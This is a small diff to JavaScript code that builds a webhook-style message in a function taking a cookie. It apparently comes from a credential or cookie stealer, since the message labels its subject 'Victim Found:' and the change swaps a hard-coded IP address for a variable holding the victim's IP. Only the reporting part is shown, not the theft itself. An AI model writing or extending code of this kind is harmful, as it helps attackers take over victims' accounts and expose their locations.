@@ -41,7 +41,7 @@ async function main(cookie) {
                   }
                 ],
                 "author": {
-                  "name": "Victim Found: " + "247.117.63.5",
+                  "name": "Victim Found: " + ipAddr,
                   "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                 },
                 "footer": {
